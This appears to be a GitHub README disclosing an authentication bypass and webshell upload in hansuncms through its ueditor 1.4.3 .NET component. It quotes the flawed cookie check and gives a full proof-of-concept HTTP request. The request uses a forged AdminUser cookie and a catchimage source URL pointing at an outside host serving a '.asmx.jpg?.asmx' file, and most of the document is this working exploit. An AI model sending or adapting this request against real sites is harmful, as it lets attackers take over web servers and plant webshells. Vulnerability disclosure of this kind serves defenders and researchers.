# hansuncmswebshell 

hansuncms  Authentication Bypass and File Upload

hansuncms [](https://www.68team.com/)
more like  CNVD-2017-20077  
hansuncms have net 1.4.3 ueditor and Authentication Bypass
<br>some code<br>
![code](https://github.com/MorStardust/hansuncmswebshell/blob/main/code.png)
 <br>if (context.Request.Cookies["AdminUser"] != null || context.Request.Cookies["AdminUser"]["SysUser"] != "")<br>

cookies have AdminUser not null can use ueditor upload webshell

poc

<br>POST /ueditor/net/controller.ashx?action=catchimage HTTP/1.1<br>
<br>Host: xxxxxxxxxx<br>
<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0<br>
<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br>
<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>
<br>Accept-Encoding: gzip, deflate<br>
<br>Content-Type: application/x-www-form-urlencoded<br>
<br>Content-Length: 59<br>
<br>Origin: xxxxxx<br>
<br>Connection: close<br>
<br>Referer: http://xxxxxxxx/cms/Login.aspx<br>
<br>Cookie:AdminUser=AdminId=1&AdminUser=1&AdminPwd=1&AdminName=1&Language=30;ASP.NET_SessionId=hlz4zjbvx0dze5haljxdxuuk<br>
<br>Upgrade-Insecure-Requests: 1<br>
<br> <br>
<br>source%5B%5D=http%3A%2F%2Fx.x.x.x%2F1.asmx.jpg%3F.asmx<br>
<br>![poc](https://github.com/MorStardust/hansuncmswebshell/blob/main/poc.png)<br>


